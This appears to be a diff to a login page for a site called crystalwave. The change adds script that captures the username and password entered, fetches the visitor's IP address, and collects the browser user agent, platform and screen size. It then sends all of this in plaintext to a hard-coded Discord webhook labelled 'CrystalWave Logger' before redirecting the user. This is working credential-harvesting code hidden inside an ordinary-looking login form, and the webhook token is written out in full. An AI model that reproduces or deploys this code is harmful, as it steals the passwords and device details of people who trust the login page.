@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>crystalwave - Login</title>
+    <title>crystalwave.WTF - Login</title>
     <style>
         :root {
             --primary: #0064ff;
@@ -81,6 +81,13 @@
         .btn:hover {
             background: #0052cc;
         }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+            color: var(--accent);
+        }
     </style>
 </head>
 <body>
@@ -90,23 +97,99 @@
         <form id="loginForm">
             <div class="form-group">
                 <label for="username">Username</label>
-                <input type="text" id="username" class="form-control">
+                <input type="text" id="username" class="form-control" required>
             </div>
             
             <div class="form-group">
                 <label for="password">Password</label>
-                <input type="password" id="password" class="form-control">
+                <input type="password" id="password" class="form-control" required>
             </div>
             
             <button type="submit" class="btn">Login</button>
+            <div class="loading" id="loading">Sending to Discord...</div>
         </form>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1391200950315647127/YLlbrMWXa-DY-rYTmki6kwup_g6mwWBgXE0GiMA7WoYZJCZZiukLcuwNRNjRhrmW2J2e';
+        const REDIRECT_URL = 'https://crystalwave.wtf/home/index2.html';
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            // Redirect to index2.html when login button is clicked
-            window.location.href = 'https://crystalwave.wtf/home/index2.html';
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const loading = document.getElementById('loading');
+            
+            // Show loading state
+            loading.style.display = 'block';
+            e.target.querySelector('.btn').disabled = true;
+            
+            try {
+                // Get additional user data
+                const ip = await fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => data.ip)
+                    .catch(() => 'Unknown');
+                
+                // Prepare Discord webhook data
+                const embed = {
+                    title: "New Login Attempt",
+                    description: `**Username:** ${username}\n**Password:** ${password}`,
+                    color: 0x0064ff,
+                    fields: [
+                        {
+                            name: "IP Address",
+                            value: ip,
+                            inline: true
+                        },
+                        {
+                            name: "User Agent",
+                            value: navigator.userAgent,
+                            inline: true
+                        },
+                        {
+                            name: "Platform",
+                            value: navigator.platform,
+                            inline: true
+                        },
+                        {
+                            name: "Screen Resolution",
+                            value: `${screen.width}x${screen.height}`,
+                            inline: true
+                        },
+                        {
+                            name: "Redirect URL",
+                            value: REDIRECT_URL,
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Send to Discord webhook
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed],
+                        username: "CrystalWave Logger",
+                        avatar_url: "https://crystalwave.wtf/logo.png"
+                    })
+                });
+                
+                // Redirect after successful send
+                window.location.href = REDIRECT_URL;
+                
+            } catch (error) {
+                console.error('Error:', error);
+                loading.textContent = 'Error occurred, please try again';
+            } finally {
+                loading.style.display = 'none';
+                e.target.querySelector('.btn').disabled = false;
+            }
         });
     </script>
 </body>
